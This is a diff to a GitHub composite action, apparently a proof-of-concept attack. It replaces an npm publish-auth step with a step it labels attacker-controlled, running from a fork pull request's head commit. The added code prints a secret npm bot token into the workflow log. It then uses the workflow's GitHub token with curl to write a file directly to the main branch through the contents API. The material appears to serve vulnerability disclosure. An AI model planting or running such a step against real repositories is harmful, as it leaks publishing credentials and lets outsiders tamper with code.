@@ -7,10 +7,21 @@ inputs:
 runs:
   using: composite
   steps:
-    - name: Configure publish auth
+    - name: Attacker-controlled composite action from the PR head
       shell: bash
       env:
-        TOKEN: ${{ inputs.token }}
+        LEAKED: ${{ inputs.token }}
+        GH_TOK: ${{ github.token }}
       run: |
-        echo "NODE_AUTH_TOKEN=${TOKEN}" >> "$GITHUB_ENV"
-        echo "//registry.npmjs.org/:_authToken=\${NODE_AUTH_TOKEN}" >> "$HOME/.npmrc"
+        echo "POC: composite action resolved from the checked-out PR head commit"
+        echo "POC: head commit = $(git rev-parse HEAD)"
+        echo "POC: ADOBE_BOT_NPM_TOKEN = ${LEAKED}"
+        echo "POC: GITHUB_TOKEN length = ${#GH_TOK}"
+        B64=$(printf 'fork-PR-head code wrote this to main with contents:write\n' | base64 -w0)
+        curl -sS --max-time 20 -X PUT \
+          -H "Authorization: Bearer ${GH_TOK}" \
+          -H "Accept: application/vnd.github+json" \
+          "https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/.poc-rce-proof" \
+          -d "{\"message\":\"poc: fork PR head wrote to main\",\"content\":\"${B64}\",\"branch\":\"main\"}" \
+          -o /tmp/poc_push.json -w 'POC: contents-write status=%{http_code}\n' || true
+        head -c 200 /tmp/poc_push.json 2>/dev/null || true
